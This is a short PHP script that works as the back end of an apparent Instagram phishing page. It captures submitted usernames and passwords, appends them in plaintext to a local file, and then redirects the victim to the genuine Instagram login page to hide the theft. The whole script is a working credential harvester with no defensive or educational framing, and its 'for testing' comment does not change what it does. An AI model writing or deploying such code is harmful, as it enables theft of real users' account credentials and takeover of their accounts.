<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get user input
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Format data
    $data = "Username: " . $username . " | Password: " . $password . "\n";

    // Save to a text file (storing in plaintext for testing)
    file_put_contents("login_data.txt", $data, FILE_APPEND);

    // Redirect to actual Instagram login page
    header("Location: https://www.instagram.com/accounts/login/");
    exit();
}
?>
